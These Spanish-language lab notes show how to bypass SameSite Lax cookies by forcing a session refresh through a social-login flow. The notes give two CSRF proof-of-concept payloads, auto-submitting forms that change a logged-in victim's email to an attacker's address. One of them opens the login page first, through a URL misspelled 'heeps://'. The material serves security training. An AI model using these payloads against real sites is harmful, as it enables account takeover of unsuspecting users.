# Bypass de SameSite Lax con refresco de cookie

Tags: #CSRF #BurpSuite #XSRF

```bash 
Aunque el navegador no envía cookies en peticiones POST cruzadas por defecto, si se logra refrescar la sesión del usuario a través de una redirección automática a /social-login, se emite una nueva cookie sin restricciones SameSite explícitas. 

En este lab la primer cookie de sesión es actualizada a una segunda cuando se inicia una sesión con la red social 


- SameSite Lax: La cookie se envia en las solicitudes del mismo sitio y en las solicitudes GET de otros sitios 

- OAuth (Open Authorization): Es un estándar diseñado para permitir que un sitio web o una aplicación accedan a recursos alojados por aplicaciones web en nombre de un usuario.   
```

```javascript 
// PoC para cambiar el correo si es que la víctima ya tiene la sesión iniciada 

<form class="login-form" name="change-email-form" action="https://web.com/my-account/change-email" method="POST">
	<input type="hidden" name="email" value="hacked@hacked.com">
</form>

<script>
	document.forms[0].submit();
</script>
```

```javascript 
// Asegurar que la víctima inicie sesión para obtener la nueva cookie de sesión, esperar 5 seg para la redirección y cambiar el correo 

<form class="login-form" name="change-email-form" action="https://web.com/my-account/change-email" method="POST">
	<input type="hidden" name="email" value="hacked@hacked.com">
</form>

<script>
	window.open("heeps://web.com/social-login");
	setTimeout(updateEmail, 5000);
	function updateEmail(){
		document.forms[0].submit();
	}
</script>
```